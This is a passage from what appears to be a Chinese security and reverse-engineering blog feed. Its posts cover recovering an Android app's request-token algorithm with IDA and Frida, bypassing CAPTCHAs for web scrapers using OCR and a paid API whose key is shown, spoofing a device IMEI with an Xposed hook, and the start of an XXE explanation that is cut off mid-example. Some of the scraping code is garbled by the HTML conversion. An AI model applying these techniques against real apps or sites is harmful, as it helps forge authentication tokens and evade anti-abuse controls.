    <content type="html"><![CDATA[<p>今天，需要做的是通过 IDA和 frida 联合调试，获取请求中的token。我们这是用 X安 app进行演示。</p><h2 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h2><p>用fiddler抓包，看一下请求头中的主要内容，确定我们要找的字段是 <code>X-APP-TOKEN</code>。</p><h2 id="apk逆向分析"><a href="#apk逆向分析" class="headerlink" title="apk逆向分析"></a>apk逆向分析</h2><p>首先，我们要去分析apk是否被加固，如果加固了就要进行脱壳，没有加固就直接分析。用 jadx打开apk，可以发现文件的各个目录非常清晰，所以很大程度上并没有加固</p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-18.png"></p><p>接下来，我们可以直接在 jadx 中全局查找我们要找的字段，<code>X-APP-TOKEN</code>。（如果找不到的话，我们需要将要查找的字段进行合理分割，分别进行全局查找。）</p><p>我们找到了目标字段后，就可以进入生成<code>X-APP-TOKEN</code>的class，可以最终生成相关字段的代码是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title">getAS</span><span class="params">(Context context, String str)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">   System.loadLibrary(<span class="string">&quot;native-lib&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>属于 native 方法, 所以我们需要分析 libnative-lib.so 文件</p><p>先用ida静态分析相关 so 文件，全局查找 <code>getAS </code>方法，无法找到，说明这个方法是被手动注册的，因为手动注册都是通过 <code>JNI_onload</code> 方法，我们可以进行这个方法查看详细信息，确定<code>getAS </code>方法修改后的名字。注意到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RegisterNatives(v3, v4, (const JNINativeMethod *)off_DB004, 1)</span><br></pre></td></tr></table></figure><p><code>RegisterNatives</code>是手动注册时调用，那么注册后的方法名肯定在这个方法里面，我们可以使用动态分析的方法获取注册后的方法名。最终可以知道，手动注册后的方法名为 <strong>getAuthString</strong>。<br>（其实手动注册后的方法名肯定还是有含义的，所以也可以 ctrl+f 慢慢找）</p><p>进入 getAuthString 方法，可以看到整个代码非常长，所以直接分析很难，我们首先要关注的是 <strong>返回值</strong>，因为返回值肯定是我们要的 token。</p><blockquote><p>token的一般格式是： timestamp + 固定字符串 + device_id + 其他</p></blockquote><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-19.png"><br>最后，我们发现 token 中还有一个关键信息 与 <code>b64_encode</code> 方法有关，因此我们可以使用 frida hook这个方法，将参数打印出来。</p><p>但是，使用 frida hook某个函数时，一般要用 <code>Module.getExportByName(&#39;.so&#39;,&#39;func_name&#39;)</code>方法，而要 hook 的函数需要被 exports 出来，我们通过 ida 的 Exports 窗口，无法发现 <code>b64_encode</code> 方法，因此不能用这种的方式 hook。</p><p>这里我们采用的方法是，通过<code>b64_encode</code>的绝对地址进行 hook。</p><p>那么，如何使用静态分析找出 <code>b64_encode</code> 的绝对地址呢？</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> getAuthString_absulate_add = Module.getExportByName(<span class="string">&#x27;libnative-lib.so&#x27;</span>, <span class="string">&#x27;getAuthString&#x27;</span>);</span><br><span class="line"><span class="comment">// 首先获取一个方法的绝对地址</span></span><br><span class="line"><span class="keyword">var</span> native_lib_base_add = <span class="built_in">parseInt</span>(getAuthString_absulate_add) - <span class="built_in">parseInt</span>(<span class="string">&#x27;0x66500&#x27;</span>);</span><br><span class="line"><span class="comment">// 使用 绝对地址 - 相对地址 的方式，获取 so 文件的基地址</span></span><br><span class="line">send(<span class="string">&#x27;native_lib_base_add:&#x27;</span>+ptr(native_lib_base_add));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> md5_init_address = ptr(native_lib_base_add + <span class="built_in">parseInt</span>(<span class="string">&#x27;0x32455&#x27;</span>));</span><br><span class="line"><span class="comment">// 使用 基地址 + 相对地址 的方式，获取目标方法的绝对地址</span></span><br><span class="line">send(<span class="string">&#x27;md5_init_address: &#x27;</span> + md5_init_address);</span><br></pre></td></tr></table></figure><p>最终，我们可以确定 token 的生成规则是：</p><p> token = “token:// 1dek212ddovfkr “+  时间戳 + “$” + device_id + “&amp;” + packagename</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今天，需要做的是通过 IDA和 frida 联合调试，获取请求中的token。我们这是用 X安 app进行演示。&lt;/p&gt;
&lt;h2 id=&quot;抓包分析&quot;&gt;&lt;a href=&quot;#抓包分析&quot; class=&quot;headerlink&quot; title=&quot;抓包分析&quot;&gt;&lt;/a&gt;抓包分析&lt;/h2&gt;&lt;</summary>
      
    
    
    
    
    <category term="Android逆向" scheme="http://yejuns.github.io/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>爬虫过验证码</title>
    <link href="http://yejuns.github.io/2021/04/09/%E7%88%AC%E8%99%AB%E4%B9%8B%E8%BF%87%E9%AA%8C%E8%AF%81%E7%A0%81/"/>
    <id>http://yejuns.github.io/2021/04/09/%E7%88%AC%E8%99%AB%E4%B9%8B%E8%BF%87%E9%AA%8C%E8%AF%81%E7%A0%81/</id>
    <published>2021-04-09T08:01:51.000Z</published>
    <updated>2021-08-05T06:42:49.668Z</updated>
    
    <content type="html"><![CDATA[<p>在我们写爬虫的过程中，目标网站常见的干扰手段就是设置验证码等，因此，这里将简单介绍一些绕过验证码的方式。</p><h2 id="1、使用pytesseract模块和PIL模块识别"><a href="#1、使用pytesseract模块和PIL模块识别" class="headerlink" title="1、使用pytesseract模块和PIL模块识别"></a>1、使用pytesseract模块和PIL模块识别</h2><p>使用pip安装相关的包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pytesseract</span><br><span class="line">pip install pil</span><br></pre></td></tr></table></figure><p>整个验证码识别的思路很简单：</p><ol><li>截取整个界面</li><li>获取验证码位置的坐标，并截取对应位置的图片</li><li>使用pytesseract模块进行验证</li></ol><p>主要的功能代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#打开谷歌浏览器</span></span><br><span class="line">   browser = webdriver.Chrome()</span><br><span class="line">   <span class="comment">#打开首页</span></span><br><span class="line">   browser.get(<span class="string">&quot;http://localhost:8080/jpress/user/register&quot;</span>)</span><br><span class="line">   browser.maximize_window()</span><br><span class="line">   <span class="comment">#获取验证码图片</span></span><br><span class="line">   t = time.time()</span><br><span class="line">   picture_name1 = <span class="built_in">str</span>(t)+<span class="string">&#x27;.png&#x27;</span></span><br><span class="line">   browser.save_screenshot(picture_name1)</span><br><span class="line">   ce = browser.find_element_by_id(<span class="string">&quot;captchaimg&quot;</span>)</span><br><span class="line">   print(ce.location)</span><br><span class="line">   left = ce.location[<span class="string">&#x27;x&#x27;</span>]</span><br><span class="line">   top = ce.location[<span class="string">&#x27;y&#x27;</span>]</span><br><span class="line">   right = ce.size[<span class="string">&#x27;width&#x27;</span>] + left</span><br><span class="line">   height = ce.size[<span class="string">&#x27;height&#x27;</span>] + top</span><br><span class="line">   im = Image.<span class="built_in">open</span>(picture_name1)</span><br><span class="line">   <span class="comment"># 抠图</span></span><br><span class="line">   img = im.crop((left,top,right, height))</span><br><span class="line">   t = time.time()</span><br><span class="line">   picture_name2 = <span class="built_in">str</span>(t)+<span class="string">&#x27;.png&#x27;</span></span><br><span class="line">   img.save(picture_name2)<span class="comment">#这里就是截取到的验证码图片</span></span><br><span class="line">   browser.close()</span><br></pre></td></tr></table></figure><p>pytesseract虽然很简单直观，但是无法处理比较复杂的验证码。这时候其实我们还可以使用一些方法对图片进行处理，提供识别率。比如对截取的图片转为灰度，将有效信息转为黑，背景和干扰转为白色。</p><p>由于我们需要找到一个像素阈值能够将灰度图片中真实数据和背景干扰分开，因此这一步骤可以借助PS等工具，我们在这里设置为200</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">img = image_obj.convert(<span class="string">&quot;L&quot;</span>)  <span class="comment"># 转灰度图</span></span><br><span class="line">pixdata = img.load()</span><br><span class="line">w, h = img.size</span><br><span class="line">threshold = <span class="number">200</span></span><br><span class="line"><span class="comment"># 遍历所有像素，大于阈值的为黑色</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h): <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w): <span class="keyword">if</span> pixdata[x, y] &lt; threshold: pixdata[x, y] =<span class="string">&quot; 0&quot;</span> <span class="keyword">else</span>:&gt;</span><br><span class="line"><span class="comment"># 根据像素二值结果重新生成图片</span></span><br><span class="line">data = img.getdata()</span><br><span class="line">w, h = img.size</span><br><span class="line">black_point = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, w - <span class="number">1</span>): <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, h - <span class="number">1</span>): mid_pixel = data[w * y + x] <span class="keyword">if</span> mid_pixel &lt; <span class="number">50</span>: top_pixel =<span class="string">&quot; data[w * (y - 1) + x]&quot;</span> left_pixel =<span class="string">&quot; data[w * y + (x - 1)]&quot;</span> down_pixel =<span class="string">&quot; data[w * (y + 1) + x]&quot;</span> right_pixel =<span class="string">&quot; data[w * y + (x + 1)]&quot;</span> <span class="keyword">if</span> top_pixel &lt; <span class="number">10</span>: black_point +=<span class="string">&quot; 1&quot;</span> <span class="keyword">if</span> left_pixel &lt; <span class="number">10</span>: <span class="keyword">if</span> down_pixel &lt; <span class="number">10</span>: <span class="keyword">if</span> right_pixel &lt; <span class="number">10</span>: <span class="keyword">if</span> black_point &lt; <span class="number">1</span>: img.putpixel((x, y), <span class="number">255</span>) black_point =<span class="string">&quot; 0&quot;</span> img.show()&lt; code&gt;</span><br></pre></td></tr></table></figure><p>转换前的图片</p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/essay/srcapyselenium-7.png"></p><p>转换后的图片</p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/essay/srcapyselenium-8.png"></p><h2 id="2、使用第三方API接口帮助识别"><a href="#2、使用第三方API接口帮助识别" class="headerlink" title="2、使用第三方API接口帮助识别"></a>2、使用第三方API接口帮助识别</h2><p>我以前是使用<code>showapi</code>,当然也可以选择别的方法，<a href="https://www.showapi.com/apiGateway/view/2360">地址</a></p><p>整个验证的流程是：</p><ol><li>下载官方提供的SDK包</li><li>在请求参数中加入自己的key</li><li>把图片和key值一起传给远程API，接收识别出的结果</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.ShowapiRequest <span class="keyword">import</span> ShowapiRequest</span><br><span class="line"></span><br><span class="line">r = ShowapiRequest(<span class="string">&quot;http://route.showapi.com/184-4&quot;</span>,<span class="string">&quot;272526&quot;</span>,<span class="string">&quot;a924d4e982ae404b8a068b4d1c7784f2&quot;</span> )</span><br><span class="line">r.addFilePara(<span class="string">&quot;image&quot;</span>, <span class="string">&quot;test.png&quot;</span>)</span><br><span class="line">r.addBodyPara(<span class="string">&quot;typeId&quot;</span>, <span class="string">&quot;34&quot;</span>)</span><br><span class="line">r.addBodyPara(<span class="string">&quot;convert_to_jpg&quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">r.addBodyPara(<span class="string">&quot;needMorePrecise&quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">res = r.post()</span><br><span class="line">result = res.text</span><br><span class="line">print(result)</span><br><span class="line">body = res.json()[<span class="string">&#x27;showapi_res_body&#x27;</span>]</span><br><span class="line">print(body[<span class="string">&#x27;Result&#x27;</span>])</span><br><span class="line"><span class="comment"># print(res.text) # 返回信息</span></span><br></pre></td></tr></table></figure><p>有时候我们也可以自己使用<code>tensorflow</code>进行训练.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在我们写爬虫的过程中，目标网站常见的干扰手段就是设置验证码等，因此，这里将简单介绍一些绕过验证码的方式。&lt;/p&gt;
&lt;h2 id=&quot;1、使用pytesseract模块和PIL模块识别&quot;&gt;&lt;a href=&quot;#1、使用pytesseract模块和PIL模块识别&quot; class=&quot;h</summary>
      
    
    
    
    
    <category term="爬虫" scheme="http://yejuns.github.io/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向第九课 - xposed</title>
    <link href="http://yejuns.github.io/2021/04/01/Android%E9%80%86%E5%90%91%E7%AC%AC%E4%B9%9D%E8%AF%BE/"/>
    <id>http://yejuns.github.io/2021/04/01/Android%E9%80%86%E5%90%91%E7%AC%AC%E4%B9%9D%E8%AF%BE/</id>
    <published>2021-04-01T03:08:51.000Z</published>
    <updated>2021-09-06T04:00:59.978Z</updated>
    
    <content type="html"><![CDATA[<h2 id="xposed-原理"><a href="#xposed-原理" class="headerlink" title="xposed 原理"></a>xposed 原理</h2><p><strong>Xposed框架核心思想在于将Java层普通函数注册成本地JNI方法，以此来变相实现hook机制</strong></p><p>Xposed 是一个 Android 平台上的动态劫持框架，它替换安卓系统 /system/bin 目录下的 app_process 来控制 zygote 进程，使得app_pross在启动时会加载 XposedBridge.jar，从而实现对zygode进程以及其创建的虚拟机的劫持，最终对系统的某些功能实现接管。(其实就是一个反射的过程)</p><ul><li>优点: xposed 可以在我们不破坏apk自身的情况下实现对函数的hook，修改函数的参数和返回值，改变函数的结构并执行我们自己的代码,用好了xposed可以对我们的逆向过程起到事半功倍的作用。</li><li>缺点:本身不能对 so 中的函数进行修改 需要结合其他框架。</li></ul><h3 id="Xposed框架构成"><a href="#Xposed框架构成" class="headerlink" title="Xposed框架构成"></a>Xposed框架构成</h3><ul><li>Xposed，Xposed 框架 Native 部分，Xposed 框架版的 app_process，用于替换原生 app_process，并为 XposedBridge 提供 JNI 方法。</li><li>XposedBridge，Xposed 框架 Java 部分，编译后会生成一个 jar 包，Xposed 框架的 app_process 会将此加入到系统 class path 中。</li><li>android_art，Xposed 框架定制的 Android ART。</li><li>XposedInstaller，Xposed 框架插件管理 App。</li><li>XposedTools，用于编译项目的工具集。</li></ul><h3 id="Xposed执行流程"><a href="#Xposed执行流程" class="headerlink" title="Xposed执行流程"></a>Xposed执行流程</h3><p>Xposed修改了app_process程序，在执行第一个java程序（com.Android.internal.os.ZygoteInit）之前进行截获,改变执行流程，进入到自身的main函数体内，这部分java层代码都写在了XposedBridge.jar中。</p><h2 id="开发-xposed-模块过程"><a href="#开发-xposed-模块过程" class="headerlink" title="开发 xposed 模块过程"></a>开发 xposed 模块过程</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>Android-studio是最新版，这边手机和模拟器装的都是 xposed89 的框架，因此 使用的 XposedBridge.jar 也是89版本，<a href="https://github.com/924587628/XposedBridgeAPI">下载地址</a>,</p><h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><p>1、在AS中新建项目，然后将 XposedBridgeApi-89.jar放到lib目录下 右键 Add As Library 将jar包添加进依赖</p><p>2、打开项目 src/main目录下的 AndroidManifest.xml文件，在 application 标签里面添加如下内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta-data</span><br><span class="line">        android:name=&quot;xposedmodule&quot;</span><br><span class="line">        android:value=&quot;true&quot; /&gt;</span><br><span class="line">&lt;meta-data</span><br><span class="line">        android:name=&quot;xposeddescription&quot;</span><br><span class="line">        android:value=&quot;Easy example&quot; /&gt;</span><br><span class="line">&lt;meta-data</span><br><span class="line">        android:name=&quot;xposedminversion&quot;</span><br><span class="line">        android:value=&quot;89&quot; /&gt;</span><br></pre></td></tr></table></figure><p>3、打开app目录下的 build.gradle ，将</p><p>compile files(‘libs/XposedBridgeApi-89.jar’)</p><p>更改为</p><p>provided files(‘libs/XposedBridgeApi-89.jar’)</p><p>4、新建Hook入口类 HookMain 实现 xposed 的接口 IXposedHookLoadPackage 并重写方法 handleLoadPackage 如图所示 这个写法格式是固定的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HookMain</span> <span class="keyword">implements</span> <span class="title">IXposedHookLoadPackage</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5、在 src/main/assets 下新建文件 xposed_init 并将 HookMain 类作为hook的主入口类以<strong>包名+类名</strong>的格式写进去。</p><p>6、检测hook环境是否配置成功，打开项目的MainActivity类并写一个getIMEI方法获取当前系统的imei并在程序运行的时候打印出来。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.layout);</span><br><span class="line">        Log.i(<span class="string">&quot;手机的imei是&quot;</span>,getIMEI(<span class="keyword">this</span>));</span><br><span class="line">        Toast.makeText(getApplicationContext(),<span class="string">&quot;手机的imei是&quot;</span>+getIMEI(<span class="keyword">this</span>),Toast.LENGTH_LONG).show();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String <span class="title">getIMEI</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//实例化TelephonyManager对象</span></span><br><span class="line">            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);</span><br><span class="line">            <span class="comment">//获取IMEI号</span></span><br><span class="line">            String imei = telephonyManager.getDeviceId();</span><br><span class="line">            <span class="keyword">if</span> (imei == <span class="keyword">null</span>) &#123;</span><br><span class="line">                imei = <span class="string">&quot; &quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> imei + <span class="string">&quot;yeyeye&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/xposed-4.png"></p><p><em>我这边用真机一直没有hook成功，在模拟器上却成功了，不知道是什么原因。</em></p><p>7、环境没问题后，我们就可以使用xposed修改部分修改手机的IMEI号，Hook一个函数需要满足三个条件:</p><ul><li>方法的包名+类名</li><li>方法名</li><li>方法的参数类型</li></ul><p>所以我这边hook的代码是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HookMain</span> <span class="keyword">implements</span> <span class="title">IXposedHookLoadPackage</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">         <span class="comment">//固定格式</span></span><br><span class="line">        findAndHookMethod(</span><br><span class="line">                <span class="string">&quot;android.telephony.TelephonyManager&quot;</span>,  <span class="comment">//要hook的包名+类名</span></span><br><span class="line">                lpparam.classLoader,                   <span class="comment">//classLoader固定</span></span><br><span class="line">                <span class="string">&quot;getDeviceId&quot;</span>,                         <span class="comment">//要hook的方法名</span></span><br><span class="line">                                                       <span class="comment">//方法参数 没有就不填</span></span><br><span class="line">                <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="comment">//方法执行前执行</span></span><br><span class="line">                    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//方法执行后执行,改方法的返回值一定要在方法执行完毕后更改</span></span><br><span class="line">                    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span></span></span><br><span class="line"><span class="function">                            <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                        param.setResult(<span class="string">&quot;355888888888888&quot;</span>);</span><br><span class="line"> </span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="相关问题"><a href="#相关问题" class="headerlink" title="相关问题"></a>相关问题</h2><h3 id="怎样才能将java层普通方法注册成JNI方法？"><a href="#怎样才能将java层普通方法注册成JNI方法？" class="headerlink" title="怎样才能将java层普通方法注册成JNI方法？"></a>怎样才能将java层普通方法注册成JNI方法？</h3><p>dalvik 虚拟机有一个 Method 结构体，里面有一个 accessFlags 标记着该方法的类型（public、native等等）。Dalvik虚拟机执行代码，在找到应用的入口函数后，会调用了一个关键的函数 dvmIsNativeMethod，这个方法的作用就是判断函数的类型。</p><p>调用 replaceDalvikImplementation 方法修改method中的 <code>accessFlags、registersSize、outsSize、insSize和jniArgInfo</code>，将原java函数对应的结构体修改为一个native函数，并调用dvmUseJNIBridge为这个Method设置一个Bridge，改变结构体中的nativeFunc，指向自定义的函数。</p><h3 id="xposed为什么没有用Class-forName-来获取class"><a href="#xposed为什么没有用Class-forName-来获取class" class="headerlink" title="xposed为什么没有用Class.forName()来获取class"></a>xposed为什么没有用Class.forName()来获取class</h3><p>查看 Class.forName() 的源码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; forName(String className) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">return</span> forName(className, <span class="keyword">true</span>, VMStack.getCallingClassLoader()); <span class="comment">//注意ClassLoader的获取方式</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到, ClassLoader 是通过 VMStack.getCallingClassLoader() 获取的。VMStack是一个虚拟机栈，在Android系统中，<strong>每个应用都有一个独立的虚拟机</strong>，所以 VMStack.getCallingClassLoader() 是获取当前应用的ClassLoader，即xposed项目的ClassLoader，所以，如果使用 Class.forName(“xxx.xxx.xxxActivity”) 获取不同应用的类会提示找不到。</p><p>参考资料</p><blockquote><p><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=850885&amp;highlight=xposed">https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=850885&amp;highlight=xposed</a><br><a href="https://www.cnblogs.com/baiqiantao/p/10699552.html">https://www.cnblogs.com/baiqiantao/p/10699552.html</a><br><a href="http://www.uml.org.cn/mobiledev/201903052.asp">http://www.uml.org.cn/mobiledev/201903052.asp</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;xposed-原理&quot;&gt;&lt;a href=&quot;#xposed-原理&quot; class=&quot;headerlink&quot; title=&quot;xposed 原理&quot;&gt;&lt;/a&gt;xposed 原理&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Xposed框架核心思想在于将Java层普通函数注册成本地JNI方法</summary>
      
    
    
    
    
    <category term="Android逆向" scheme="http://yejuns.github.io/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Web安全之XXE</title>
    <link href="http://yejuns.github.io/2021/03/31/Web%E5%AE%89%E5%85%A8%E4%B9%8BXXE%E6%94%BB%E5%87%BB/"/>
    <id>http://yejuns.github.io/2021/03/31/Web%E5%AE%89%E5%85%A8%E4%B9%8BXXE%E6%94%BB%E5%87%BB/</id>
    <published>2021-03-31T08:01:51.000Z</published>
    <updated>2021-08-17T01:21:13.183Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><p>XXE漏洞全称XML External Entity Injection，即XML外部实体注入漏洞，是在对不安全的外部实体数据进行处理时引发的安全问题。（我们提交的post数据中，body可以是<code>application/xml</code>的形式）</p><h2 id="XXE漏洞原理"><a href="#XXE漏洞原理" class="headerlink" title="XXE漏洞原理"></a>XXE漏洞原理</h2><p>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，攻击者通过向服务器注入指定的xml实体内容, 从而让服务器加载恶意外部文件， 造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。也就是说服务端接收和解析了来自客户端的xml数据,而又没有做严格的安全过滤校验, 从而导致xml外部实体注入漏洞的产生。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>通常攻击者会将payload注入XML文件中，一旦文件被执行，将会读取服务器上的本地文件，并对内网发起访问扫描内部网络端口。换而言之，XXE是一种从本地到达各种服务的方法。此外，在一定程度上这也可能帮助攻击者绕过防火墙规则过滤或身份验证检查。</p><p>以下是一个正常的XML代码POST请求示例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /vulnerable HTTP/1.1</span><br><span class="line">Host: www.test.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Referer: https://test.com/test.html</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 294</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span 